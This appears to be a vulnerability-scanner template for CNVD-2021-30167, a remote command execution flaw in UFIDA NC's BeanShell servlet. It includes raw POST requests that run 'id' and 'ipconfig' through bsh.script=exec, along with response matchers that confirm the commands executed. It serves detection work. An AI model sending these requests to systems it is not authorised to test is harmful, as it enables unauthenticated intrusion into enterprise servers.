http:
- matchers:
  - condition: or
    regex:
    - uid=
    - Windows IP
    type: regex
  - type: word
    words:
    - BeanShell Test Servlet
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    bsh.script=exec("id");

    '
  - 'POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    bsh.script=exec("ipconfig");

    '
id: CNVD-2021-30167
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: UFIDA NC BeanShell contains a remote command execution vulnerability
    in the bsh.servlet.BshServlet program.
  metadata:
    max-request: 2
  name: UFIDA NC BeanShell Remote Command Execution
  reference:
